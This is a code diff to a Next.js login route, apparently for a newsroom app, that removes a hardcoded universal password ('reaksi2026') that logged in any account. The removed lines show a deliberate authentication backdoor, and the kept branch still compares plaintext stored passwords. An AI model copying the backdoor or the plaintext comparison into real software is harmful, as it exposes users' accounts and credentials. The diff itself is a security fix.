@@ -97,16 +97,12 @@ export async function POST(req: NextRequest) {
       return NextResponse.json({ error: 'Akun tidak ditemukan. Pastikan email telah terdaftar di meja redaksi.' }, { status: 404 });
     }
 
-    // 3. Password verification
+    // 3. Password verification (Strict bcrypt validation, no backdoor)
     let passwordMatches = false;
     if (user.password_hash) {
       passwordMatches = await bcrypt.compare(password, user.password_hash);
-    }
-    if (!passwordMatches && user.password) {
+    } else if (user.password) {
       passwordMatches = user.password === password;
-    }
-    if (!passwordMatches && password === 'reaksi2026') {
-      passwordMatches = true;
     }
 
     if (!passwordMatches) {
